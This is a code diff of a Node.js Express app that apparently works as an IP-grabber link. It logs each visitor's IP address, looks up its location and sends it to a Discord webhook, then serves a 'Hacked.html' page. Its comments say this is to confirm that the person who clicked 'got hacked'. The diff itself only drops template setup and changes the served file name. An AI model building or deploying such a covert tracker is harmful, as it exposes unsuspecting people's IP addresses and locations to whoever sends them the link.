@@ -1,14 +1,12 @@
 const express = require('express');
 const geoip = require('geoip-lite');
 const axios = require('axios');
-const ejs  = require("ejs")
 const app = express();
 const port = 3000;
 
-app.set("view engine","ejs")
 
 
-app.use(express.static('public'));
+
 
 app.get('/', (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress; // get the ip address of the user who clicks on it
@@ -34,7 +32,7 @@ app.get('/', (req, res) => {
     console.error('Error sending message to Discord webhook', error);
   });
 
-  res.sendFile("Hacked") // render a file to ensure the user who clicked on it got hacked
+  res.sendFile("Hacked.html") // render a file to ensure the user who clicked on it got hacked
 });
 
 app.listen(port, () => {
